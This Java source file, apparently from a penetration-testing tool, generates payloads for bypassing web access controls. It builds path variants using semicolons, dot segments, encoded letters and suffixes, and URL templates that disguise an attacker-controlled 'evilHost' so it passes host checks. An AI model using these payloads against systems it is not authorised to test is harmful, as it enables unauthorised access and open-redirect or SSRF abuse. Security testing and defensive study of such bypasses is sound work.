package org.m2sec.modules.bypass;

import org.m2sec.common.models.Target;
import org.m2sec.common.utils.HttpUtil;

import java.net.URL;
import java.util.HashSet;
import java.util.Set;

/**
 * @author: outlaws-bai
 * @date: 2024/3/10 15:05
 * @description:
 */
public class BypassTools {
    public static Set<String> generateBypassPathPayloads(String path) {
        // 正常化处理下path
        path = HttpUtil.normalizePath(path);
        Set<String> payloads = new HashSet<>();

        // 1. 在请求的每个/中间插入干扰字符，一般为getRequestUri引起.
        // 假设原始请求路径为/api/test，绕过字符为;，经过处理后应该生成如下路径/;/api/;/test
        for (String bypassString : bypassPathStep1StringArray) {
            payloads.add(path.replace("/", bypassString));
        }
        // 2. URL编码请求路径，一般为getRequestUri引起,假设原始请求路径为/api/test，经过处理后应该生成如下路径,/%61%70%69/%74%65%73%74
        payloads.add(encodeAllLetters(path));
        // 3. 末尾添加.xxx的形式来绕过，一般为setUseSuffixPatternMatch引起,
        // 假设原始请求路径为/api/test，经过处理后应该生成如下路径/api/test.xxx
        if (!path.contains(".")) {
            payloads.add(path + ".json");
        }
        // 4.
        // 末尾添加干扰字符的形式来绕过，一般为nginx配置了location=xxx这样的黑名单引起的,假设原始请求路径为/api/test，绕过字符为;，经过处理后应该生成如下路径/api/test;
        payloads.add(path + "/");
        payloads.add(path + "//");
        payloads.add(path + ";");
        payloads.add(path + "/.");
        payloads.add(path + "/..");
        // 5. 转换大小写
        payloads.add(path.toUpperCase());
        // 6. add more. 可参考文章: https://tttang.com/archive/1899/
        return payloads;
    }

    public static Set<String> generateBypassUrlPayloads(Target originTarget, URL evilUrl) {
        Set<String> payloads = new HashSet<>();
        for (String payloadTemplate : payloadTemplateArray) {
            payloads.add(
                    payloadTemplate
                            .replace("{protocol}", originTarget.getProtocol())
                            .replace("{originHost}", originTarget.getHost())
                            .replace("{evilHost}", evilUrl.getAuthority()));
        }
        return payloads;
    }

    /**
     * URL编码input中所有的字母
     *
     * @param input ...
     * @return ...
     */
    public static String encodeAllLetters(String input) {
        StringBuilder result = new StringBuilder();

        for (char c : input.toCharArray()) {
            if (Character.isLetter(c)) {
                // 如果是字母，则进行URL编码
                String encoded = "%" + Integer.toHexString(c).toUpperCase();
                result.append(encoded);
            } else if (c == '%') {
                // 如果是%，直接将%及其后两个字符添加到结果中
                result.append(c);
                if (input.length() >= result.length() + 2) {
                    result.append(input, result.length(), result.length() + 2);
                }
            } else {
                // 如果是其他字符，直接添加到结果中
                result.append(c);
            }
        }

        return result.toString();
    }

    private static final String[] bypassPathStep1StringArray =
            new String[] {
                "/./",
                "\\/",
                "/;/",
                "/.;/",
                "//;//",
                "//",
                "/health/..;/",
                "/%2e/",
                "/%0a/",
                "/health/%2e%2e;/",
                "/%20/"
            };

    private static final String[] payloadTemplateArray =
            new String[] {
                "{protocol}://{evilHost}",
                "//{evilHost}",
                "{protocol}://{originHost}.{evilHost}",
                "{protocol}://{evilHost}?{originHost}",
                "{protocol}://{evilHost}/{originHost}",
                "{protocol}://{evilHost}%ff@{originHost}",
                "{protocol}://{evilHost}%ff.{originHost}",
                "{protocol}://{originHost}%25253F@{evilHost}",
                "{protocol}://{originHost}%253F@{evilHost}",
                "{protocol}://{originHost}%3F@{evilHost}",
                "{protocol}://{originHost}@{evilHost}",
                "{protocol}://foo@{evilHost}:80@{originHost}",
                "{protocol}://foo@{evilHost}%20@{originHost}",
                "{protocol}://foo@{evilHost}%09@{originHost}",
                "{protocol}://{evilHost}[@{originHost}",
            };
}
